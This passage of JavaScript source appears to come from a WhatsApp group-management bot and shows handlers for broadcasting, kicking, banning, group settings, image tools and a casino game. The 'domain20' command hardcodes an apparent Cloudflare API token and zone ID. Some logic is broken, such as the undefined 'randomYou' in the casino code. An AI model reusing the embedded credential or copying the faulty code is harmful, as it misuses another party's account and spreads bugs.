${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
replynano(respon)
            }}
            break
            case 'bctext': case 'broadcasttext': case 'broadcast': { if (prefix === '.') {
			    if (!DanzTheCreator) return reply(mess.only.owner)
		            if (!q) return replynano(`Enter text`)
		        const data = await store.chats.all()
        for (let i of data) {
           LordVoltage.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
           await sleep(1000)
        }
        }}
        break
        case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid': if (prefix === '.') {
if(!DanzTheCreator) return reply(mess.only.owner)
        if (!q) return replynano(`Enter text`)
        let getGroups = await LordVoltage.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        replynano(` Post in ${xeoncast.length} Group Chat, in ${xeoncast.length * 1,5} seconds`)
        for (let i of xeoncast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await LordVoltage.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await LordVoltage.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        replynano(`Broadcast Successfully in Group ${xeoncast.length}`)   }   
        break
case 'block': case 'ban': { if (prefix === '.') {
		if (!DanzTheCreator) return reply(mess.only.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await LordVoltage.updateBlockStatus(users, 'block')
		await replynano(`Done`)
	}}
	break
        case 'unblock': case 'unban': { if (prefix === '.') {
		if (!DanzTheCreator) return reply(mess.only.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await LordVoltage.updateBlockStatus(users, 'unblock')
		await replynano(`Done`)
	}}
	break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': { if (prefix === '.') {
	const lisben = "Total Block: " + banUser.length
	replynano(lisben)
	}}
	break

case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
LordVoltage.groupRevokeInvite(m.chat)
}}
break
            case 'react': { if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
reactionMessage = {
react: {
    text: args[0],
    key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
}
}
LordVoltage.sendMessage(m.chat, reactionMessage)
            }}
            break
case 'unmute': case 'mute': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!q) return replynano(`Send orders ${command} _options_\nOptions : close & open\nExample : ${command} close`)
if (args[0] == 'close') {
  reply(`*₊˚🗝 ࣪𓂃˚☽ ｡⋆ . . .  「 _it's time_ ${botname} close the group 〞*

     ♡゙. . .Namaste˚☽˚｡⋆
 ━ ━༝ ₊˚good night/morning everyoneﾟ｡𓊇
· · • • • 🪷 • • • ·`)
LordVoltage.groupSettingUpdate(from, 'announcement')
} else if (args[0] == 'open') {
  reply(`*₊˚🗝 ࣪𓂃˚☽ ｡⋆ . . .  「 _hello everyone ,it's time to open_ 〞*

     ♡゙. . .Come on, Deploy *SHADØW-XMD-V1*, hehe
type *.menu* to see the bot list˚☽˚｡⋆
 ━ ━༝ ₊˚ check script : ${saluran} ﾟ｡𓊇
· · • • • 🪷 • • • ·`)
LordVoltage.groupSettingUpdate(from, 'not_announcement')
} else {
  let msg = 'Use: \n .mute on to lock\n Use: \n .mute off to open.'
            await LordVoltage.sendMessage(
                m.chat, 
                { text:msg}, 
                     {    
                     quoted:m
                     }) ;
}}}
break
case 'autostickergc':
            case 'autosticker':{ if (prefix === '.') {
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (args.length < 1) return replynano('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return replynano(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replynano('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replynano('auto sticker deactivated')
}}}
break
case 'nsfw': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (args[0] === "on") {
if (AntiNsfw) return replynano('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replynano('Success in turning on nsfw in this group')
var groupe = await LordVoltage.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
LordVoltage.sendMessage(from, {text: `𓊈 *WARNING* 𓊉\n\nηѕƒω(ησт ѕαƒє ƒσя ωσяк) ƒєαтυяє нαѕ вєєη єηαвℓє∂ ιη тнιѕ gяσυρ, ωнι¢н мєαηѕ σηє ¢αη α¢¢єѕѕ ѕєχυαℓ gяαρнι¢ѕ ƒяσм тнє вσт!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replynano('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replynano('Success in turning off nsfw in this group')
} else {
  let msg = '𝐔𝐬𝐞: \n .nsfw on to turn on\n 𝐔𝐬𝐞: \n .nsfw off to turn off.'
            await LordVoltage.sendMessage(
                m.chat, 
                { text:msg}, 
                     {    
                     quoted:m
                     }) ;
  }}
  }
  break
             
		case 'antilink': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (args[0] === "on") {
if (AntiLinkTwitter) return replynano('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replynano('Success in turning on all antilink in this group')
var groupe = await LordVoltage.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
LordVoltage.sendMessage(from, {text: `𓊈 *WARNING* 𓊉\n\nιƒ уσυ'яє ησт αη α∂мιη, ∂ση'т ѕєη∂ αηу ℓιηк ιη тнιѕ gяσυρ σя υ ωιℓℓ вє кι¢кє∂ ιммє∂ιαтєℓу!`, contextInfo: { mentionedJid : mems }}, {quoted:fkontak})
} else if (args[0] === "off") {
if (!AntiLinkAll) return replynano('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replynano('𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐃𝐢𝐬𝐚𝐛𝐥𝐞𝐝 𝐀𝐧𝐭𝐢𝐥𝐢𝐧𝐤 𝐈𝐧 𝐓𝐡𝐢𝐬 𝐆𝐫𝐨𝐮𝐩')
} else {
  let msg = '𝐔𝐬𝐞: \n .antilink on to turn on\n 𝐔𝐬𝐞: \n .antilink off to turn off.'
            await LordVoltage.sendMessage(
                m.chat, 
                { text:msg}, 
                     {    
                     quoted:m
                     }) ;
  }}
  }
  break
case 'antitoxic': case 'antibadword': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (args[0] === "on") {
if (antiToxic) return replynano('Already activated')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replynano('Success in turning on antitoxic in this group')
var groupe = await LordVoltage.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
LordVoltage.sendMessage(from, {text: `𓊈 *WARNING* 𓊉\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return replynano('Already deactivated')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replynano('Success in turning off antitoxic in this group')
} else {
  let msg = 'Use: \n .antibadword on to turn on\n Use: \n .antibadword off off to turn off.'
            await LordVoltage.sendMessage(
                m.chat, 
                { text:msg}, 
                     {    
                     quoted:m
                     }) ;
  }}}
  break
case 'domain20': { if (prefix === '.') {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f2bc5ee0d4471aa74dd689c297c7aa43";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "panellofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replynano("USE .domain4 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replynano("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replynano(ip1 ? "valid ip source" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) replynano(`*_Succeed Adding Subdomain🙂_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By FamousDev 👑_*`);
             else replynano(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }}
           break
  
   case 'leavegc':
case 'leave': { if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
await LordVoltage.groupLeave(m.chat)
await replynano(`Done`)
            }}
            break
case 'add': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!DanzTheCreator) return reply(mess.only.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await LordVoltage.groupParticipantsUpdate(m.chat, [users], 'add')
await replynano(`Done`)
}}
break
case 'closetime': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replynano('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replynano(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
LordVoltage.groupSettingUpdate(from, 'announcement')
replynano(close)
}, timer)
}}
break
           case 'ephemeral':
case 'disappear': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!isAdmins) return reply('Admin only!!')
if (!text) return replynano('Enter the value enable/disable')
if (args[0] === 'enable') {
await LordVoltage.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
} else if (args[0] === 'disable') {
await LordVoltage.sendMessage(m.chat, { disappearingMessagesInChat: false })
await replynano(`Done`)
}
            }}
            break
            case 'delete': case 'del': { if (prefix === '.') {
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!m.quoted) throw false
let { chat, id } = m.quoted
 LordVoltage.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }}
            break
            
case 'linkgroup':
case 'linkgc':
case 'gclink':
case 'grouplink': {
    if (prefix === '.') {
        const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
        let response = await LordVoltage.groupInviteCode(m.chat);
        LordVoltage.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true });
    }
    break;
}
case 'd': { if (prefix === '.') {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replynano('The message was not sent by a bot!')
                 LordVoltage.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }}
            break
case 'opentime': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replynano('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replynano(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
LordVoltage.groupSettingUpdate(from, 'not_announcement')
replynano(open)
}, timer)
}}
break
case 'kick': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await LordVoltage.groupParticipantsUpdate(m.chat, [users], 'remove')
await replynano(`Done`)
}}
break
//=========================================\\
case 'kickall': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
const users = participants.map(a => a.id)
await LordVoltage.groupParticipantsUpdate(m.chat, [users], 'remove')
await replynano(`Done`)
}}
break
case 'setbotname':{ if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!text) return replynano(`Where's the name?\Example: ${prefix + command} SHADØW`)
    await LordVoltage.updateProfileName(text)
    replynano(`Success in changing the name of bot's number`)
    }}
    break
case 'setbotbio':{ if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!text) return replynano(`Wheres the name?\nExample: ${prefix + command} ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧`)
    await LordVoltage.updateProfileStatus(text)
    replynano(`Success in changing the bio of bot's number`)
    }}
    break
   case 'setnamegc': case 'setgroupname': case 'setsubject': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!text) return replynano('Text ?')
await LordVoltage.groupUpdateSubject(m.chat, text)
await replynano(`Done`)
            }}
            break
          case 'setdesc': case 'setdesk': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!isAdmins) return reply('Admin only!!')
if (!text) return replynano('Text ?')
await LordVoltage.groupUpdateDescription(m.chat, text)
await replynano(`Done`)
            }}
            break
//=========================================\\
case 'getpp':{ if (prefix === '.') {
if (!m.isGroup) return reply ("Used specifically in groups")
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await LordVoltage.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
LordVoltage.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}}
break 
//=========================================\\
case 'setppgc': case 'setgcpp': case 'setgroup': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!quoted) return replynano(`Where is the picture?`)
if (!/image/.test(mime)) return replynano(`Send/Reply to Images With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replynano(`Send/Reply to Images With Caption ${prefix + command}`)
var mediz = await LordVoltage.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await LordVoltage.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replynano(`Success`)
} else {
var memeg = await LordVoltage.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replynano(`Success`)
}}
}
break
case 'deleteppgroup': case 'delgcpp': case 'deleteppgc': case 'delppgroup': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
    await LordVoltage.removeProfilePicture(from)
    }}
    break
case 'deleteppbot': case 'delppbot': { if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
    await LordVoltage.removeProfilePicture(LordVoltage.user.id)
    replynano(`Success in deleting bot's profile picture`)
    }}
    break
case 'promote': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await LordVoltage.groupParticipantsUpdate(m.chat, [users], 'promote')
await replynano(`Done`)
}}
break
case 'demote': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await LordVoltage.groupParticipantsUpdate(m.chat, [users], 'demote')
await replynano(`Done`)
}}
break
case 'hidetag': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
LordVoltage.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}}
break
case 'ht': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
if (!DanzTheCreator) return reply(mess.only.owner)
LordVoltage.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}}
break

case 'totag':
case 'tag': { if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
               if (!m.quoted) return replynano(`Reply message with caption ${prefix + command}`)
               LordVoltage.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }}
               break

case 'tagall': {
  if (prefix === '.') {
    if (!m.isGroup) return reply(mess.only.group);
    if (!isAdmins) return reply('Admin only!!');
    me = m.sender;
    let teks = `  〘   *Tag All*   〙
 •• *Message : ${q ? q : 'empty'}* ••
        •• *Tagger* ••
  @${me.split('@')[0]}\n\n`;
    for (let mem of participants) {
      teks += `${themeemoji} @${mem.id.split('@')[0]}\n`;
    }
    await LordVoltage.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: fkontak });
  }
}
break
case 'ebinary': { if (prefix === '.') {
if (!q) return replynano(`Send/reply text with captions ${prefix + command}`)
reply(mess.wait)
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(`${q}`)
replynano(eb)
}}
break
case 'dbinary': { if (prefix === '.') {
if (!q) return replynano(`Send/reply text with captions ${prefix + command}`)
reply(mess.wait)
let { dBinary } = require('./scrape/binary')
let db = await dBinary(`${q}`)
replynano(db)
}}
break
case 'toanime': case 'jadianime': { if (prefix === '.') {
if (!isPrem) return reply(mess.only.premium)
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photos With Caption ${prefix + command}`)
try {
reply(mess.wait)
const media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
const imganime = await fetchJson(`https://itzpire.com/tools/jadianime?url=${anuu}`)
LordVoltage.sendMessage(m.chat, { image: { url: imganime.result }, caption: 'Selesai'}, { quoted: m})
	} catch {
	  reply('Yes, please report the error to the owner so it can be fixed')
	}
}}
break
//=========================================\\
case 'removebg': case 'nobg': case 'hapusbackground': { if (prefix === '.') {
if (!quoted) return replynano(`where's the photo bro?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photos With Caption ${prefix + command}`)
try {
reply(mess.wait)
const media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
const getimg = await fetchJson(`https://itzpire.com/ai/remove-bg?url=${anuu}`)
LordVoltage.sendMessage(m.chat, { image: { url: getimg.result }, caption: 'Selesai'}, { quoted: m})
	} catch {
	  reply('Yes, please report the error to the owner so it can be fixed')
	}
}}
break
//=========================================\\
case 'hd':
  case 'remini':{ if (prefix === '.') {
if (!quoted) return replynano(`Where is the picture?`)
			if (!/image/.test(mime)) return replynano(`Send/Reply to Photos with captions ${prefix + command}`)
			reply(mess.wait)
			try {
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			LordVoltage.sendMessage(m.chat, { image: proses, caption: `_Successful creation ${command}_`}, { quoted: m})
			} catch {
			  reply('this is a mistake')
			}}
			}
			break
//=========================================\\
case 'ss':
case 'ssweb':{ if (prefix === '.') {
if (!text) return replynano(`where's the link?`)
try {
LordVoltage.sendMessage(m.chat, { image: { url: `https://apis.davidcyriltech.my.id/ssweb?url=${encodeURIComponent(text)}` }}, { quoted: m})
			} catch {
	  reply('Yes, please report the error to the owner so it can be fixed')
	}
}}
break
//======================================================================
case 'nulis':
case 'nulisbuku': { if (prefix === '.') {
  if (!isPrem) return replyprem(mess.premium)
  const { format } = require('util')
const { spawn } = require('child_process')
    let fontPath = 'src/Zahraaa.ttf'
    let inputPath = 'src/kertas.jpg'
    let d = new Date()
    let tgl = d.toLocaleDateString('id-Id')
    let hari = d.toLocaleDateString('id-Id', { weekday: 'long' })
    if (!args[0])  return reply('what do you want to write?')
    let teks = args.join` `
    let bufs = []
    const [_spawnprocess, ..._spawnargs] = [...(global.ownername? ['gm'] : global.ownername ? ['magick'] : []),
        'convert',
        inputPath,
        '-font',
        fontPath,
        '-size',
        '1024x784',
        '-pointsize',
        '20',
        '-interline-spacing',
        '1',
        '-annotate',
        '+806+78',
        hari,
        '-font',
        fontPath,
        '-size',
        '1024x784',
        '-pointsize',
        '18',
        '-interline-spacing',
        '1',
        '-annotate',
        '+806+102',
        tgl,
        '-font',
        fontPath,
        '-size',
        '1024x784',
        '-pointsize',
        '20',
        '-interline-spacing',
        '-7.5',
        '-annotate',
        '+344+142',
        teks,
        'jpg:-'
    ]
    spawn(_spawnprocess, _spawnargs)
        .on('error', e => m.reply(format(e)))
        .on('close', () => {
            LordVoltage.sendFile(m.chat, Buffer.concat(bufs), 'nulis.jpg', 'Im done writing it', m)
        })
        .stdout.on('data', chunk => bufs.push(chunk))
}}
break
case 'ttslide': case 'tiktokslide':{ if (prefix === '.') {
if (!text) return replynano(`Use it by the way ${prefix+command} *url*\n\n_Examples_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
LordVoltage.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://widipe.com/download/tiktokslide?url=${text}`)
await LordVoltage.sendMessage(m.chat, { image: { url: anu.result.images}, caption: anu.result.title}, {quoted: m})
await LordVoltage.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await LordVoltage.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}}
}
break
//=========================================\\
case 'casino': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
let buatall = 1
    LordVoltage.casino = LordVoltage.casino ? LordVoltage.casino : {}
    if (m.chat in LordVoltage.casino) return reply ('There are still people doing casino here, wait until its finished!!')
    else LordVoltage.casino[m.chat] = true
    try {
        let randomaku = `${Math.floor(Math.random() * 101)}`.trim()
        let randomkamu = `${Math.floor(Math.random() * 81)}`.trim() //hehe Biar Susah Menang :v
        let Aku = (randomaku * 1)
        let Kamu = (randomYou * 1)
        let count = args[0]
        count = count ? /all/i.test(count) ? Math.floor(global.db.users[m.sender].exp / buatall) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
        count = Math.max(1, count)
        if (args.length < 1) return reply('casino <amount>\n ' + 'casino 1000', )
        if (global.db.users[m.sender].exp >= count * 1) {
            global.db.users[m.sender].exp -= count * 1
            //await reply('') //Kwkwwkkwlwlw
            if (Aku > Kamu) {
                reply(`💰 Casino 💰\n*You:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You LOSE*\nYou lost ${count} Money(xp)`)
            } else if (Aku < Kamu) {
                global.db.users[m.sender].exp += count * 2
                reply(`💰 Casino 💰\n*You:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You Win*\nYou get ${count * 2} Money(xp)`)
            } else {
                global.db.users[m.sender].exp += count * 1
                reply(`💰 Casino 💰\n*You:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*series*\nYou get ${count * 1} Money(xp)`)
            }
        } else reply(`Your money (xp) is not enough for the Casino, please *#work* first!`)
    } catch (e) {
        console.log(e)
        reply('Error!!')
        if (DevMode) {
            for (let jid of global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != LordVoltage.user.jid)) {
                LordVoltage.sendMessage(jid, 'casino.js error\nNo: *' + m.sender.split`@`[0] + '*\nCommand: *' + m.text + '*\n\n*' + e + '*', MessageType.text)
            }
        }
    } finally {
        delete LordVoltage.casino[m.chat]
    }
}}
break
//=========================================\\
//=========================================\\
case 'kerja':
case 'work': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let type = (args[0] || '').toLowerCase()
    let users = global.db.users[m.sender]
    let time = users.lastkerja + 30000
    let __timers = (new Date - users.lastkerja)
    let _timers = (1000 - __timers)
    let timers = clockString(_timers)

    let penumpan = ['mas mas', 'father', 'the same girl', 'little epep', 'mothers mother']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]

    let daganga = ['carrot', 'mustard greens', 'lettuce', 'tomato', 'celery', 'chili', 'meat', 'fish', 'chicken']
    let dagangan = daganga[Math.floor(Math.random() * daganga.length)]
    
    let pasie = ['headache', 'injury', 'burn', 'fracture']
    let pasien = pasie[Math.floor(Math.random() * pasie.length)]

    let pane = ['Carrots', 'Cabbage', 'stowbery', 'tea', 'rice', 'orange', 'banana', 'watermelon', 'durian', 'rambutan']
    let panen = pane[Math.floor(Math.random() * pane.length)]

    let bengke = ['car', 'motorcycle', 'rickshaw', 'rickshaw', 'bus', 'angkot', 'rickshaw', 'bike']
